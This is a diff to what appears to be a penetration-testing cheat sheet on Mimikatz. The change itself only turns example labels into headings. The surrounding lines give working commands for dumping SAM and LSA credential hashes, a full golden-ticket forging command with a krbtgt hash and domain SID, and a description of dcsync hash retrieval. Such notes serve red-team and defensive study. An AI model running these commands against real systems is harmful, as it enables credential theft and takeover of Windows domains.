@@ -297,7 +297,7 @@ https://github.com/ParrotSec/mimikatz
 https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
 ```
 
-example: dump hashes
+#### example: dump hashes
 ```
 privilege::debug
 ```
@@ -318,14 +318,14 @@ lsadump::sam
 lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM secrets dump). It can operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM ). It has the following command line arguments: /sam : the offline backup of the SAM hive.
 
 
-example 2:
+#### example 2:
 ```
 lsadump::lsa
 ```
 This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).
 
 
-golden ticket example:
+#### golden ticket example:
 ```
 .\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
@@ -360,7 +360,7 @@ Golden Ticket Default Groups:
 * Enterprise Admins SID: S-1-5-21<DOMAINID>-519 (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
 * Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
   
-example 3: 
+#### example 3: 
   
 Mimikatz has a feature (dcsync) which utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file. This technique eliminates the need to authenticate directly with the domain controller as it can be executed from any system that is part of the domain from the context of domain administrator. Therefore it is the standard technique for red teams as it is less noisy.
 ```
